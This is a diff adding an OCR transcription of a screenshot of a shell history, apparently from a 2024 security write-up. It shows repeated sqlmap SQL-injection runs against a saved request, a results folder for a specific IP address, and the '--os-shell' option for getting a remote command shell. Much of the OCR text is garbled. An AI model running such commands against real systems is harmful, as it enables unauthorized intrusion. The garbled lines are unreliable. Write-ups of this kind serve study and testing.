@@ -1,0 +1,36 @@
+# OCR: cf326e74af3e21eadda5f414cbe1f70d.jpg
+# 来源: .\02-WriteUp\2024\cf326e74af3e21eadda5f414cbe1f70d.jpg
+# 引擎: tesseract(chi_sim+eng)
+# 生成: 2026-08-31 15:42
+
+[| zsh history 巳
+1
+BOD
+日 明 巳 口 口 口 尸 一 一 巳 一 一
+aw
+屁 春 易 日 日 明 口 吕 驯 启 吴 吴 口 吊 芒 与 a a
+b s h b
+Is
+mkdir sqlmap
+cd sqlmap
+1s
+pwd
+vim 1.txt
+python sqlmap.py -r 1.txt --batch
+sqlmap -r 1.txt --batch
+vim 1.txt
+sqlmap -r 1.txt --batch
+vim 1.txt
+sqlmap -r 1.txt --batch
+sqlmap -r 1.txt --batch
+sqlnap -r 1.txt --batch
+sqlmap -r 1.txt --batch
+ed /root/.local/share/sqlmap/output/112.124.62.187
+1s
+cat log
+sqlmap -r 1.txt --batch --os-shell
+cd /root
+1s
+cd sqlmap
+1s
+sqlmap -r 1.txt --batch --os-shell
